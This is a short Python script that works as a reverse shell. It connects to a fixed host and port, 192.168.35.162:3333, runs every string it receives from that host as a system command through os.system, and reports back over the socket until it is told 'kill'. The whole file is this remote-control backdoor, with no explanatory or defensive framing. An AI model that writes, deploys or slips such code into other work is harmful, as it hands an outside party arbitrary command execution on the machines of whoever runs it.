import socket
import os
import time

host = "192.168.35.162"
port = 3333

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sckt:
    sckt.connect((host, port))
    
    while True:
        try:
            data = sckt.recv(1024)
            data = data.decode('utf-8')
            if bool(data):
                if data != 'kill':
                    try:
                        os.system(data)
                        sckt.send(bytes('Command Successfuly .', 'utf-8'))
                    except Exception as ex:
                        sckt.sendall(bytes('Command Failed !', 'utf-8'))
                        sckt.sendall(ex)
                else:
                    sckt.sendall(bytes('Killing..', 'utf-8'))
                    time.sleep(300)
                    sckt.sendall(bytes('Killed .', 'utf-8'))
                    sckt.close()
                    break
        except Exception as ex:
            print(ex)

    print("Connection Disconnected !")
